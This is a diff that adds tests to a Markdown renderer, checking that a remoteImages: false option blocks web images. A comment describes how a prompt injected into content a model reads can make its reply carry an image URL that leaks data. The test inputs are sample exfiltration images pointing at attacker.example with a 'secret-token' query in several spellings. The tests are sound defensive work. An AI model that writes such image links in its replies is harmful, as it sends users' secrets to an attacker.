@@ -341,3 +341,40 @@ test("the resolver is cleared after the render, error or not", () => {
   const plain = renderMarkdown("![b](two.png)");
   assert.match(plain, /src="two\.png"/);
 });
+
+// ── text nobody vetted: no image from the web ────────────────────────────────
+// A model's reply is rendered as Markdown, and a prompt hidden in what it read
+// can make it write an image whose address carries that out. With
+// remoteImages: false, no such address survives, in either spelling of an
+// image, while data: images and ordinary links are untouched.
+
+test("remoteImages: false loads no image from the web, whichever way it is written", () => {
+  const opts = { remoteImages: false } as const;
+  for (const md of [
+    "![status](https://attacker.example/p?q=secret-token)",
+    "![status](http://attacker.example/p?q=secret-token)",
+    "![status](//attacker.example/p?q=secret-token)",
+    '<img alt="status" src="https://attacker.example/p?q=secret-token">',
+    "[![status](https://attacker.example/p?q=secret-token)](https://example.com/run)",
+    "> quoted: ![status](https://attacker.example/p?q=secret-token)",
+  ]) {
+    const html = renderMarkdown(md, 0, opts);
+    assert.doesNotMatch(html, /attacker\.example/, md);
+    assert.match(html, /<img [^>]*src=""/, `${md}: an empty src, which requests nothing`);
+    assert.match(html, /alt="status"/, `${md}: the alt text still says what it was`);
+  }
+  // A link is a click away, not a request: it stays.
+  assert.match(renderMarkdown("[docs](https://example.com/docs)", 0, opts), /href="https:\/\/example\.com\/docs"/);
+  // A data: image is already on the page.
+  const px = "data:image/png;base64,iVBORw0KGgo=";
+  assert.match(renderMarkdown(`![px](${px})`, 0, opts), /src="data:image\/png;base64,iVBORw0KGgo="/);
+  // And a resolver's local file still shows.
+  assert.match(renderMarkdown("![a](a.png)", 0, { ...opts, resolveImage: (r) => `file:///repo/${r}` }), /src="file:\/\/\/repo\/a\.png"/);
+  // …but a resolver pointing at the web does not.
+  assert.doesNotMatch(renderMarkdown("![a](a.png)", 0, { ...opts, resolveImage: (r) => `https://raw.example/${r}` }), /raw\.example/);
+});
+
+test("remoteImages: false lasts one render: the next one loads web images as before", () => {
+  renderMarkdown("![a](https://attacker.example/a.png)", 0, { remoteImages: false });
+  assert.match(renderMarkdown("![b](https://img.shields.io/b.svg)"), /src="https:\/\/img\.shields\.io\/b\.svg"/);
+});
